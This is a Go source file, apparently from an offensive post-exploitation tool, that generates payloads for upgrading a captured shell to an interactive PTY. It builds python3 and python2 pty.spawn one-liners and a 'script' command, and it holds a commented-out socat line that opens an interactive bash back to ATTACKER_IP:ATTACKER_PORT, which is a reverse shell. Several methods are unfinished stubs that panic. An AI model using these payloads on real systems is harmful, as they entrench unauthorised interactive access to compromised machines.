package upgrader

import (
	"fmt"

	"github.com/smavl/gok/internal/prober/types"
)

type PtySpawner interface{
	GetPayload() string
}

type Python3 struct {
	binPath		string
	bashPath	string
}

func newPython3(results *types.ProbeResults) *Python3 {
	bin, err := results.GetBinary("python3")
	if err != nil {
		panic("python3 not found in results, but was found earlier")
	}
	binPath := bin.Path
	bash,err := results.GetBinary("bash")
	if err != nil {
		panic("bash not found in results, but was found earlier")
	}
	bashPath := bash.Path
	return &Python3{
		binPath: binPath,
		bashPath: bashPath,
	}
}

func (pty Python3) GetPayload() string {
	// check both paths are well-formed
	if pty.binPath == "" || pty.bashPath == "" {
		panic("invalid paths for python3 pty payload")
	}
	payload := fmt.Sprintf("%s -c 'import pty; pty.spawn(\"%s\")'", pty.binPath, pty.bashPath)
	return payload
}

type Python2 struct {}

func (pty Python2) GetPayload() string {
	panic("not implemented")
	payload := "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
	return payload
}
//

type Socat struct {}

func (pty Socat) GetPayload() string {
	panic("not implemented")
	// requires starting up another listener
	// payload := "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:ATTACKER_PORT"
	// return payload
}

//
type Script struct {}

func (pty Script) GetPayload() string {
	payload := "script -qc /bin/bash /dev/null"
	return payload
	// panic("not implemented")
}

